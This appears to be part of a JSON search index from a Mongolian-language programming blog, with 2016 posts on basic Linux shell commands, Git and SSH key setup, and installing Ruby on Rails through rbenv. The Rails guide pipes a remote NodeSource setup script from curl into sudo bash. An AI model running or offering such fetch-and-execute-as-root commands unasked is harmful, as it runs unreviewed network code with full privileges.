тѳрѳл, үүссэн огноо гэх мэт дэлгэрэнгүй мэдээллийг харах боломж бий.\ncd Тухайн directory - чиглэлыг ѳѳрчлѳх, нэг directory-гоос нѳгѳѳ directory уруу орох ерѳнхий үүрэгтэй. root directory уруу хандах үѳд “cd /” home directory уруу хандах үед “cd” эсвэл “cd ~” Нэг алхамаар урагшлах үѳд “cd ..” Ѳмнѳх directory уруу буцах үед “cd -” cp Файлыг хуулах, copy хийх үүрэг гүйцэтгэнэ. Жишээлбэл: “cp file foo” нь file - хуулах үйлдэл хийн хуулж байгаа файлдаа “foo” нэртэй нэр ѳгч байна. Directory, copy хийх гэж байгаа бол “cp -r directory foo” (рекурс хуулах). Рекурс нь ямар учиртай вэ? Directory-г хуулах үѳд бүх файлуудыг нь хуулах үйлдийг давтах гэх мэтээр…\nmv Файлыг ѳѳр байршил уруу шилжүүлэх мѳн нэр ѳѳрчлѳх үүрэгтэй. Жишээлбэл: “mv file foo” нь file - ын нэрийг foo болгон ѳѳрчилж байна. “mv foo ~/Desktop” комманд нь foo нэртэй файлыг Desktop Directory уруу шилжүүлж байна. rm Энэхүү коммандыг ашиглан файл усгтаж болно. Жишээлбэл: “rm -f user/desktop/foo” нь user-ын Desktop directory-гоос force-оор foo файлыг устгаж байна.\nrmdir Хоосон directory-г устгах үед ашиглана. Харин дотроо файл болон контент агуулагдаж байгаа directory-г устгахын тулд “rm -r” коммандыг ашиглана.\nmkdir Шинээр directory үүсгэх үүрэгтэй. Жишээлбэл: “mkdir music” нь music нэртэй directory үүсгэж байна.\nman Ѳѳр бусад коммандуудын хэрэглэх аргачлал, зааврыг харуулна. Жишээлбэл: “man man” гэж бичихэд man коммандыг үүрэг, хэрхэн ашиглах гэх мэт document гарч ирнэ. sudo Зѳвхѳн Root user - д зѳвшѳѳрѳл олгох үүрэгтэй. Жишээлбэл: home directory-гын гаднаас файл хуулах шаардлага гарлаа гэж бодоё. “mv /mydoc.odt ~/Documents/mydoc.odt” гэж бичин гэж бодож байвал энэ нь буруу юм. Яагаад гэвэл home directory - гын гаднаас юм оруулах зѳвшѳѳрѳл бидэнд байхгүй байгаад юм. Харин “sudo mv /mydoc.odt ~/Documents/mydoc.odt” гэж бичиж ѳгснѳѳр бүгд хэвийн ажиллана. sudo коммандыг ашиглаж байгаа үѳд болгоомжтой байх нь чухал. Root user - ээр хандаж байгаа үѳд system - ээ ч гэмтээх магадал бий болохоор.\n","permalink":"https://cadil.github.io/posts/2016-01-04-command-line/","summary":"Оршил Руби дээр ажиллаж байх үед терминалтай бол байнга ажиллана. Хэрвээ терминал дээр ажиллаж мэдэхгүй бол анхан шатны хэдэн коммандуудын үүргийг тайлбарлан бичсэн байгаа.\nSUDO Kомманд Дийлэнх комманд нь sudo - оор эхэлдэг. SUDO буюу superuserdo нь тухайн роот хэрэглэгчийн бүрэн эрхийг идэвхжүүлэх, тухайн роот хэрэглэгчийн фолдер, файлыг бүрэн эрхтэйгээр удирдах эрх олгож байгаа юм. Sudo коммандыг ашиглах үѳд гараас хэрэглэгчийн нууц үгийг оруулж ѳгѳх ёстой.\nФайл болон Зам (Directory) Долгионтой тэмдэгт (~) ээр home directory-г илэрхийлнэ.","title":"Энгийн коммандууд"},{"content":"Version Control Version Control - д Github, BitBucket - гээд олон байгаа. Дийлэнх тохиолдолд Git-ыг ашиглана. Git дээр райлс дээр хѳгжүүлэлт хийж байгаа тѳслѳѳ commit хийх ба ѳѳрчлѳлт бүрийг оруулаад тест хийж баталгаатай болгож байгаад commit хийгээд явах юм. Git дээр үүсгэсэн repository-д олон цагийг commit хийх болохоор энэ хэсэг их чухал юм.\nБагаараа хамтран райлс тѳсѳл дээр ажиллаж байгаа тохиолдолд CI буюу Continuous Integration - ыг сайн шийдсэн байх хэрэгтэй болдог. Ажиллах процесс нь багын гишүүд бүр ѳѳрийн ѳѳрчлѳлтыг repository-д нэмэхээс ѳмнѳ райлс апплейкшнд шинээр хийсэн ѳѳрчлѳлт бүрд тест хийн шалгаад явах юм. Энгийнээр бол багаар ажиллаж байгаа үед алдаатай commit хийсэн тохиолдолд багын ажлыг тэр чигт нь холион бантанд нь хутгадаг, тэр асуудлыг шийдээд ѳгѳх, тѳслийн удирдагч ѳѳрѳѳ хувийн тохиргоо хийж ѳгсѳнѳѳр тѳслийг баллах гэсэн аюулаас нэг алхам холдож чадаж байгаа юм. Git Ѳѳрийн github аккоунттайгаа холбох хэрэгтэй. Аккоунт байхгүй бол Github - орж бүртгүүлээрэй.\nYOUR NAME, YOUR@EMAIL.COM оронд ѳѳрийн нэр, майл хаягаа бичнэ:\ngit config --global color.ui true git config --global user.name \u0026quot;YOUR NAME\u0026quot; git config --global user.email \u0026quot;YOUR@EMAIL.com\u0026quot; ssh-keygen -t rsa -C \u0026quot;YOUR@EMAIL.com\u0026quot; SSH Шинээр үүссэн SSH key - ыг ѳѳрийн github account - д хуулж ѳгнѳ. Copy хийсэн бол SSH Key-ээ энд хуулна.\ncat ~/.ssh/id_rsa.pub Холболт шалгах Хуулсан бол ажиллаж байгаа эсэхийг нь check хийж үзье:\nssh -T git@github.com Ийм message гарч ирэх ёстой:\nHi excid3! You've successfully authenticated, but GitHub does not provide shell access. ","permalink":"https://cadil.github.io/posts/2016-01-03-git/","summary":"Version Control Version Control - д Github, BitBucket - гээд олон байгаа. Дийлэнх тохиолдолд Git-ыг ашиглана. Git дээр райлс дээр хѳгжүүлэлт хийж байгаа тѳслѳѳ commit хийх ба ѳѳрчлѳлт бүрийг оруулаад тест хийж баталгаатай болгож байгаад commit хийгээд явах юм. Git дээр үүсгэсэн repository-д олон цагийг commit хийх болохоор энэ хэсэг их чухал юм.\nБагаараа хамтран райлс тѳсѳл дээр ажиллаж байгаа тохиолдолд CI буюу Continuous Integration - ыг сайн шийдсэн байх хэрэгтэй болдог.","title":"Git"},{"content":"Руби суулгах [2.2.3] sudo apt-get update sudo apt-get install git-core curl zlib1g-dev build-essential libssl-dev libreadline-dev libyaml-dev libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev libcurl4-openssl-dev python-software-properties libffi-dev Эхллэд зарим шаардлагатай зүйлсийг суулгана. Ruby-г суулгах үндсэндээ 3 арга байдаг. Тус бүр ѳѳр ѳѳрийн гэсэн давуу талуудтай.\nrbenv rvm from source Хамгийн recommended арга нь rbenv, rvm хоёр юм. Энэ удаа rbenv аргаар ruby-г суулгана. Rbenv арга нь энгийн хоёр алхамтай. Эхлээд rbenv-гээ суулгаад дараа нь ruby-build - ээ суулгана:\ncd git clone git://github.com/sstephenson/rbenv.git .rbenv echo 'export PATH=\u0026quot;$HOME/.rbenv/bin:$PATH\u0026quot;' \u0026gt;\u0026gt; ~/.bashrc echo 'eval \u0026quot;$(rbenv init -)\u0026quot;' \u0026gt;\u0026gt; ~/.bashrc exec $SHELL git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build echo 'export PATH=\u0026quot;$HOME/.rbenv/plugins/ruby-build/bin:$PATH\u0026quot;' \u0026gt;\u0026gt; ~/.bashrc exec $SHELL git clone https://github.com/sstephenson/rbenv-gem-rehash.git ~/.rbenv/plugins/rbenv-gem-rehash rbenv install 2.2.3 rbenv global 2.2.3 ruby -v Rubygems - ыг илүү дутуу documentation-гүйгээр суулгана:\necho \u0026quot;gem: --no-ri --no-rdoc\u0026quot; \u0026gt; ~/.gemrc gem install bundler Rails суулгах [4.2.4] Rails суулгахын ѳмнѳ NodeJS суулгана:\ncurl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash - sudo apt-get install -y nodejs Rails суулгая:\ngem install rails -v 4.2.4 Rails суусан эсэхийг шалгах:\nrbenv rehash Rails -v коммандыг ашиглан яг бүрэн суусан эсэхийг шалгая:\nrails -v # Rails 4.2.4 ","permalink":"https://cadil.github.io/posts/2016-01-03-ruby-on-rails-setup/","summary":"Руби суулгах [2.2.3] sudo apt-get update sudo apt-get install git-core curl zlib1g-dev build-essential libssl-dev libreadline-dev libyaml-dev libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev libcurl4-openssl-dev python-software-properties libffi-dev Эхллэд зарим шаардлагатай зүйлсийг суулгана. Ruby-г суулгах үндсэндээ 3 арга байдаг. Тус бүр ѳѳр ѳѳрийн гэсэн давуу талуудтай.\nrbenv rvm from source Хамгийн recommended арга нь rbenv, rvm хоёр юм. Энэ удаа rbenv аргаар ruby-г суулгана. Rbenv арга нь энгийн хоёр алхамтай. Эхлээд rbenv-гээ суулгаад дараа нь ruby-build - ээ суулгана:","title":"Ruby on Rails суулгах"}]